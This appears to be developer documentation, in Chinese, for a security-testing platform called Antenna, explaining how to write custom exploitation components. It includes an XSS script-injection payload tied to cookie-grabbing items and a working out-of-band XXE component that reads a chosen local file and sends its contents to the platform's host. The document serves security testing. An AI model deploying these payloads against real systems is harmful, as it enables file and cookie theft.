---
sidebar_position: 2
---

# 如何实现自己的自定义组件
终于来到我们最希望让你看到的篇章，如果你认为我们的Antenna提供的组件并不能
完全你的需求，特别是不满意我们系统提供的少得可怜的组件，那我们建议你不如自己
动手制作满足你需求的组件

## 自定义利用组件模板 
首先看一下组件基础类代码
```python

class BaseTemplate:
    info = [{
        "template_info": {
            "name": "",  # 组件名
            "title": "",  # 组件展示标题名
            "author": "",  # 组件作者
            "type": 0,  # 组件类型，1是监听0是利用
            "desc": "",  # 组件介绍
            "desc_url": "",  # 组件使用说明链接
            "choice_type": 1,  # 组件选择类型0是单选，1是多选
            "payload": "</tExtArEa>\'\"><sCRiPt sRC=//{domain}/{key}></sCrIpT>",  # 组件实例生成后展示的模板
            "file_name": "xss.py"  # 代码文件名
        },
        "item_info": [{
            "name": "xss_get_cookie",  #组件配置名
            "config": [],       # 组件配置是否需要外界用户填写参数值
        },
            {
                "name": "xss_get_page_code",
                "config": [],
            }
        ]
    }]

    def __init__(self):
        self.ip = SERVER_IP
        self.domain = PLATFORM_DOMAIN

    def run(self, key):
        task_config_item = TaskConfigItem.objects.filter(task_config__key=key)
        if task_config_item:
            config = [{"name": i.template_config_item.name, "config": i.value, }
                      for i in
                      task_config_item]
        else:
            config = []
        return self.generate(key, config)

    
    def replace_code(self, code=""):
        """
        替换code
        """
        code_ = code.replace("{{domain}}", self.domain).replace("{{key}}", self.key)
        return code_
    
    @abstractmethod
    def generate(self, key, config):
        pass

```
由于利用组件的作用在于返回一些能够触发漏洞的响应内容，所以只需要调用gengerate方法选择使用的匹配使用组件就好啦，基类会提供给平台的**IP**与**域名**
方便各位使用
那让我们尝试创建一个XXE 读取文件的组件吧
## 开发XXE组件
### 组件信息配置 Template_info
```python
class XxeTemplate(BaseTemplate):
    info = [{
        "template_info": {
            "name": "XXE",  # 组件名
            "title": "XXE漏洞利用组件",  # 组件展示标题名
            "author": "bios000",  # 组件作者
            "type": 0,  # 组件类型，1是监听0是利用
            "desc": "",  # 组件介绍
            "desc_url": "",  # 组件使用说明链接
            "choice_type": 1,  # 组件选择类型0是单选，1是多选
            "payload": """<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "http://{domain}/{key}">
    %xd;
]>
<root>&bbbb;</root>""",
            "file_name": "xxe.py"
        },
        "item_info": [{
            "name": "xxe_read_file",
            "config": ["path"],
        }],
    }]
```
按照XXE的漏洞特性，填写组件相关配置信息， 其中需要说明的是item_info相关信息
```json
"item_info": [{
            "name": "xxe_read_file",
            "config": ["path"],
        }],
```
由于我们想实现一个读取文件的功能，而且也需要用户输入他们想读取的文件路径,所以这里在config中加入一个自定义参数**path**，提供给用户使其输入
当然你想叫**abc** 也可以，不过我们建议使用用户可以容易明白的名字。

### 逻辑方法 xxe_read_file
```python
    def xxe_read_file(self, item):
        """
        读取文件
        """
        read_file_code = """<!ENTITY % aaaa SYSTEM "file://{{path}}">
<!ENTITY % demo "<!ENTITY bbbb SYSTEM 'http://{{domain}}/{{key}}?message=%aaaa;'>">
%demo;
        """
        code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
            "config"]["path"])
        
        return code
```
这里注意你的方法名需要与之前template_info中item的name保持一致，不然平台接收到组件生成实例的请求后并不能准确的找到你写的逻辑方法
，由于我们的组件生成实例，其中 **{{domain}}**和**{{key}}**在执行中将替换成平台的域名以及该组件创建实例后生成的key，**{{path}}** 会替换为你需要用户输入读取文件参数的值

### 平台接收后如何寻找到你的组件模板-generate
```python
def generate(self, key, config):
        code = ''
        self.key = key
        try:
            for i in config:
                item_name = i["name"]
                for name in self.__dir__():
                    if name == item_name:
                        code = code + getattr(self, name)(i)
            return HttpResponse(code, content_type='application/xhtml+xml')
        except Exception as e:
            import traceback
            traceback.print_exc()
            return Response({'status': 'false', 'message': '操作失败'})
```
gengerate方法通过所搜该类中所有的方法名来判断该执行哪个符合用户需求的返回资源逻辑
然后将资源以http的形式返回，注意我们的content_type需要改成xml格式
这样一个简单的组件就写好了